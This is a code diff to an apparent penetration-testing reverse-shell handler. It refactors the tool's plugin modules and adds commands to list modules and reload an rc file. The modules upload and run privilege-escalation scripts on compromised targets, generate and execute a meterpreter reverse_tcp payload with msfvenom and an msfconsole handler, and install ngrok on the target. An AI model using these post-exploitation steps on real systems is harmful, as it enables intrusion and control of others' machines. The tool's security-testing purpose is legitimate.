@@ -534,10 +534,10 @@ class MainMenu(BetterCMD):
 		super().__init__()
 		self.set_id(None)
 		self.commands = {
-			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'script'],
+			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'script', 'portfwd'],
 			"Session Management":['sessions', 'use', 'interact', 'kill', 'dir|.'],
 			"Shell Management"  :['listeners', 'connect', 'hints', 'Interfaces'],
-			"Miscellaneous"     :['help', 'history', 'reset', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
+			"Miscellaneous"     :['help', 'modules', 'history', 'reset', 'reload', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
 		}
 
 	@property
@@ -587,8 +587,6 @@ class MainMenu(BetterCMD):
 							cmdlogger.warning("No session ID selected. Select one with \"use [ID]\"")
 						else:
 							cmdlogger.warning("No available sessions to perform this action")
-						if func.__name__ == 'do_run':
-							self.show_modules()
 						return False
 				else:
 					if ID:
@@ -754,7 +752,7 @@ class MainMenu(BetterCMD):
 	@session(current=True)
 	def do_portfwd(self, line):
 		"""
-		host:port (<-/->) host:port
+		[host]:[port] (<-|->) host:port
 		Local and Remote port forwarding
 
 		Examples:
@@ -897,12 +895,16 @@ class MainMenu(BetterCMD):
 		else:
 			cmdlogger.warning("No script to execute")
 
-	def show_modules(self):
+	@staticmethod
+	def show_modules():
 		table = Table(joinchar=' <-> ')
 		table.header = [paint('MODULE NAME').cyan_UNDERLINE, paint('DESCRIPTION').cyan_UNDERLINE]
-		for module in Module.modules.values():
-			table += [paint(module.name).red, module.description]
-		print("\n", table, "\n", sep="")
+		for module in modules().values():
+			description = module.run.__doc__ or ""
+			if description:
+				description = module.run.__doc__.strip().splitlines()[0]
+			table += [paint(module.__name__).red, description]
+		print("\n", textwrap.indent(str(table), '  '), "\n", sep="")
 
 	@session(current=True)
 	def do_run(self, module_name):
@@ -910,10 +912,9 @@ class MainMenu(BetterCMD):
 		[module name]
 		Run a module. Run 'help run' to view the available modules"""
 		if module_name:
-			module = Module.modules.get(module_name)
+			module = modules().get(module_name)
 			if module:
-				module.session = core.sessions[self.sid]
-				module.run()
+				module.run(core.sessions[self.sid])
 			else:
 				logger.warning(f"Module '{module_name}' does not exist")
 		else:
@@ -1185,6 +1186,20 @@ class MainMenu(BetterCMD):
 		print("exit")
 		return self.do_exit(line)
 
+	def do_modules(self, line):
+		"""
+
+		Show available modules
+		"""
+		self.show_modules()
+
+	def do_reload(self, line):
+		"""
+
+		Reload the rc file
+		"""
+		load_rc()
+
 	def do_SET(self, line):
 		"""
 		[option, [value]]
@@ -1198,7 +1213,7 @@ class MainMenu(BetterCMD):
 		"""
 		if not line:
 			rows = [ [paint(param).cyan, paint(repr(getattr(options, param))).yellow]
-					for param in options.__dict__ if param != 'modules' ]
+					for param in options.__dict__]
 			table = Table(rows, fillchar=[paint('.').green, 0], joinchar=' => ')
 			print(table)
 		else:
@@ -1275,7 +1290,7 @@ class MainMenu(BetterCMD):
 		return self.sessions(text, "*")
 
 	def complete_run(self, text, line, begidx, endidx):
-		return [module for module in Module.modules.keys() if module.startswith(text)]
+		return [module.__name__ for module in modules().values() if module.__name__.startswith(text)]
 
 
 class ControlQueue:
@@ -1842,9 +1857,9 @@ class Session:
 				if not options.no_timestamps and not self.logpath.exists():
 					self.logfile.write(datetime.now().strftime(paint("%Y-%m-%d %H:%M:%S: ").magenta).encode())
 
-			for module in Module.modules.values():
-				module.session = self
-				module.session_start()
+			for module in modules().values():
+				if module.enabled and module.on_session_start:
+					module.run(self)
 
 			self.maintain()
 
@@ -2575,12 +2590,6 @@ class Session:
 		return self.need_binary(name, url)
 
 	def upgrade(self):
-		if self._upgrade():
-			for module in Module.modules.values():
-				module.session = self
-				module.post_upgrade()
-
-	def _upgrade(self):
 		if self.OS == "Unix":
 			if self.agent:
 				logger.warning("Python agent is already deployed")
@@ -3552,9 +3561,9 @@ class Session:
 				else:
 					logger.error(f"Sessions {sessions} need a control session.")
 
-			for module in Module.modules.values():
-				module.session = self
-				module.session_end()
+			for module in modules().values():
+				if module.enabled and module.on_session_end:
+					module.run(self)
 
 			core.control << f'self.sessions[{self.id}].kill()'
 			if thread_name == 'Menu':
@@ -3608,86 +3617,83 @@ class Session:
 
 
 class Module:
-	modules = dict()
-	def __init__(self):
-		self.name = self.__class__.__name__
-		Module.modules[self.name] = self
-
-	def run(self):
-		pass
-
-	def session_start(self):
-		pass
-
-	def session_end(self):
-		pass
-
-	def post_upgrade(self):
-		pass
+	enabled = True
+	on_session_start = False
+	on_session_end = False
 
 class upload_privesc_scripts(Module):
-	description = 'Upload privilege escalation scripts to the target'
-	def run(self):
-		if self.session.OS == 'Unix':
-			self.session.upload(BINARIES['linpeas'])
-			self.session.upload(BINARIES['lse'])
-		elif self.session.OS == 'Windows':
-			self.session.upload(BINARIES['winpeas'])
-			self.session.upload(BINARIES['powerup'])
+	def run(session):
+		"""
+		Upload privilege escalation scripts to the target
+		"""
+		if session.OS == 'Unix':
+			session.upload(BINARIES['linpeas'])
+			session.upload(BINARIES['lse'])
+		elif session.OS == 'Windows':
+			session.upload(BINARIES['winpeas'])
+			session.upload(BINARIES['powerup'])
 
 class peass_ng(Module):
-	description = 'Run the latest version of PEASS-ng in the background'
-	def run(self):
-		if self.session.OS == 'Unix':
-			self.session.script(BINARIES['linpeas'])
-		elif self.session.OS == 'Windows':
+	def run(session):
+		"""
+		Run the latest version of PEASS-ng in the background
+		"""
+		if session.OS == 'Unix':
+			session.script(BINARIES['linpeas'])
+		elif session.OS == 'Windows':
 			logger.error("This module runs only in Unix shells")
 
 class lse(Module):
-	description = 'Run the latest version of linux-smart-enumeration in the background'
-	def run(self):
-		if self.session.OS == 'Unix':
-			self.session.script(BINARIES['lse'])
+	def run(session):
+		"""
+		Run the latest version of linux-smart-enumeration in the background
+		"""
+		if session.OS == 'Unix':
+			session.script(BINARIES['lse'])
 		else:
 			logger.error("This module runs only in Unix shells")
 
 class meterpreter(Module):
-	description = 'Get a meterpreter shell'
-	def run(self):
-		if self.session.OS == 'Unix':
+	def run(session):
+		"""
+		Get a meterpreter shell
+		"""
+		if session.OS == 'Unix':
 			logger.error("This module runs only in Windows shells")
 		else:
 			payload_path = f"/dev/shm/{rand(10)}.exe"
-			host = self.session._host
+			host = session._host
 			port = 5555
 			payload_creation_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
 			result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)
 
 			if result.returncode == 0:
 				logger.info("Payload created!")
-				uploaded_path = self.session.upload(payload_path)
+				uploaded_path = session.upload(payload_path)
 				if uploaded_path:
-					meterpreter_handler_cmd = f'msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST {host}; set LPORT {port}; run"'
+					meterpreter_handler_cmd = (
+						f'msfconsole -x "use exploit/multi/handler; '
+						f'set payload windows/meterpreter/reverse_tcp; '
+						f'set LHOST {host}; set LPORT {port}; run"'
+					)
 					Open(meterpreter_handler_cmd, terminal=True)
 					print(meterpreter_handler_cmd)
-					self.session.exec(uploaded_path[0])
+					session.exec(uploaded_path[0])
 			else:
 				logger.error(f"Cannot create meterpreter payload: {result.stderr}")
 
 class ngrok(Module):
-	description = 'Setup ngrok'
-	def run(self):
-		if self.session.OS == 'Unix':
-			self.session.upload(BINARIES['ngrok_linux'], remote_path=self.session.tmp)
-			self.session.exec(f"tar xf {self.session.tmp}/ngrok-v3-stable-linux-amd64.tgz -C ~/.local/bin")
+	def run(session):
+		"""
+		Setup ngrok
+		"""
+		if session.OS == 'Unix':
+			session.upload(BINARIES['ngrok_linux'], remote_path=session.tmp)
+			session.exec(f"tar xf {session.tmp}/ngrok-v3-stable-linux-amd64.tgz -C ~/.local/bin")
 			token = input("Authtoken: ")
-			self.session.exec(f"ngrok config add-authtoken {token}")
+			session.exec(f"ngrok config add-authtoken {token}")
 		else:
 			logger.error("This module runs only in Unix shells")
-
-for subclass in Module.__subclasses__():
-	subclass()
-
 
 class Messenger:
 	SHELL = 1
@@ -4281,7 +4287,6 @@ class Options:
 		self.default_listener_port = 4444
 		self.default_interface = "0.0.0.0"
 		self.hints = False
-		self.no_history = False
 		self.no_log = False
 		self.no_timestamps = False
 		self.no_colored_timestamps = False
@@ -4306,7 +4311,6 @@ class Options:
 		self.cmd_histfile = 'cmd_history'
 		self.debug_histfile = 'cmd_debug_history'
 		self.useragent = "Wget/1.21.2"
-		self.configfile = self.basedir / 'penelope.conf'
 
 	def __getattribute__(self, option):
 		if option in ("logfile", "debug_logfile", "cmd_histfile", "debug_histfile"):
@@ -4352,14 +4356,6 @@ class Options:
 			else:
 				os.environ['http_proxy'] = value
 				os.environ['https_proxy'] = value
-
-		elif option == 'configfile':
-			self.__dict__[option] = value
-			config = ConfigParser(interpolation=None)
-			config.read(str(self.configfile))
-			if "options" in config.sections():
-				for _option, _value in config['options'].items():
-					setattr(self, _option, eval(_value))
 
 		elif option == 'basedir':
 			value.mkdir(parents=True, exist_ok=True)
@@ -4519,6 +4515,20 @@ def listener_menu():
 	listener_menu.finishing.set()
 	return True
 
+def modules():
+	return {module.__name__:module for module in Module.__subclasses__()}
+
+def load_rc():
+	RC = Path(options.basedir / "peneloperc")
+	try:
+		with open(RC, "r") as rc:
+			exec(rc.read(), globals())
+	except FileNotFoundError:
+		RC.touch()
+	os.chmod(RC, 0o600)
+
+load_rc()
+
 def main():
 
 	## COMMAND LINE OPTIONS
@@ -4545,9 +4555,7 @@ def main():
 	log.add_argument("-CT", "--no-colored-timestamps", help="Do not color timestamps in session logs", action="store_true")
 
 	misc = parser.add_argument_group("Misc")
-	misc.add_argument("-r", "--configfile", help="Configuration file location", type=Path, metavar='')
 	misc.add_argument("-m", "--maintain", help="Maintain NUM total shells per target", type=int, metavar='')
-	misc.add_argument("-H", "--no-history", help="Disable shell history on target", action="store_true")
 	misc.add_argument("-P", "--plain", help="Just land to the main menu", action="store_true")
 	misc.add_argument("-S", "--single-session", help="Accommodate only the first created session", action="store_true")
 	misc.add_argument("-C", "--no-attach", help="Disable auto attaching sessions upon creation", action="store_true")
